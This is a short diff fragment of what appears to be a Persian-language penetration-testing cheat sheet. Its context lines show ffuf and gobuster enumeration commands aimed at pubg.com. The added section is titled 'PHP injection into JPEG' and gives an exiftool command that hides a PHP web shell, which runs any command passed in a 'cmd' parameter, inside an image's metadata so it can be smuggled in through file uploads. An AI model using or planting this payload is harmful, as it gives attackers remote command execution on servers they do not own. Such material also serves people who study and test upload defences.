@@ -288,3 +288,9 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 
 gobuster dns -t 50 -d pubg.com -w ~/seclists/Dir/subdomains.dat
 ```
 
+## تزریق php درون jpeg
+
+```text
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' me.jpg
+```
+
